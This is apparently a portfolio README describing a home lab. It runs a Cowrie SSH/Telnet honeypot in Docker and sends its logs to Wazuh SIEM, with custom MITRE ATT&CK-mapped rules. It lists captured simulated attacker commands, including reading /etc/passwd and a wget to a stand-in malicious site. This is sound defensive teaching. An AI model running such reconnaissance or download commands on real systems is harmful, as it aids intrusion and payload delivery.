# 🛡️ SSH/Telnet Honeypot Deployment & Threat Tracking with Wazuh SIEM

## 📌 Project Overview
This project demonstrates the deployment of an interactive **SSH/Telnet Honeypot (Cowrie)** running inside isolated **Docker** containers, integrated with **Wazuh SIEM** for real-time JSON log ingestion, custom correlation rules, and automated threat mapping against the **MITRE ATT&CK** framework.

The primary goal of this home lab is to simulate a deceptive defense layer capable of capturing attacker credentials, post-exploitation commands, and Indicators of Compromise (IoCs) without exposing the underlying host infrastructure.

---

## 🏗️ Lab Architecture
* **SIEM Server & Sensor Host:** Linux Mint workstation running Wazuh (Manager, Indexer, Dashboard) and Docker Engine.
* **Deception Sensor (Honeypot):** `cowrie/cowrie` Docker container exposing fake SSH (`2222`) and Telnet (`2223`) services with persistent volume mapping to `/var/log/cowrie/cowrie.json`.
* **SOC Analyst & Adversary Simulation Workstation:** Windows 11 Pro desktop with WSL2 (Kali Linux) used for SIEM dashboard monitoring, network scanning (`Nmap`), and controlled intrusion simulation.

---

## ⚙️ Technical Implementation

### 1. Deploying Cowrie Honeypot with Docker
To isolate the deception environment from the host OS, Cowrie was deployed via Docker with port forwarding and persistent JSON logging:

```bash
sudo mkdir -p /var/log/cowrie
sudo chmod 777 /var/log/cowrie

sudo docker run -d --name cowrie \
  -p 2222:2222 -p 2223:2223 \
  -v /var/log/cowrie:/cowrie/cowrie-git/var/log/cowrie \
  cowrie/cowrie
```

### 2. Log Ingestion & Custom Wazuh Detection Rules
Wazuh Manager was configured to monitor the `cowrie.json` telemetry file via the `localfile` module (`configs/ossec_snippet.xml`). Additionally, custom correlation rules (`IDs 100100–100103` in `configs/local_rules.xml`) were developed to classify events by severity and map behaviors to MITRE ATT&CK:

* **Rule `100101` (Level 7):** Brute-force / Failed login attempts (`MITRE T1110`).
* **Rule `100102` (Level 10):** Unauthorized access granted to the emulated shell (`MITRE T1078`).
* **Rule `100103` (Level 12):** Post-exploitation command execution captured (`MITRE T1059`).

---

## 🔍 Detection Results & Forensic Analysis

### 1. Full Intrusion Timeline (Initial Access to Session Close)
Wazuh captured the entire lifecycle of the attacker's session, from initial SSH handshake (`Rule 100100`) and unauthorized shell login (`Rule 100102`, Level 10) to session termination:

![Full Intrusion Timeline](screenshots/01-full-timeline.png)

### 2. Threat Hunting & Critical Command Filtering (DQL)
Using Wazuh's DQL search bar (`cowrie.command.input`), high-severity alerts (`Level 12`, `Rule 100103`) were isolated to inspect the exact commands executed by the adversary (`whoami`, `cat /etc/passwd`, and `wget http://malicious.site`):

![Filtered Critical Alerts](screenshots/02-wazuh-alerts.png)

### 3. Deep-Dive Event Inspection & MITRE ATT&CK Mapping
Expanding the critical **Level 12 (`Rule 100103`)** alert confirms the log source (`/var/log/cowrie/cowrie.json`) and automatically maps the malicious execution behavior to **`T1059` (*Command and Scripting Interpreter*)**:

![MITRE Details](screenshots/03-mitre-details.png)

---

## 🛠️ Incident Response & Mitigation Recommendations
In a production SOC environment, detecting this activity would trigger the following containment and hardening workflow:
1. **Perimeter Containment:** Block the offending source IP (`src_ip`) at the edge firewall / WAF.
2. **SSH Hardening:** Disable password-based authentication (`PasswordAuthentication no`) on legitimate production servers and enforce SSH key pairs.
3. **Automated Active Response:** Enable Wazuh Active Response or `Fail2Ban` to dynamically drop connections after repeated authentication failures.
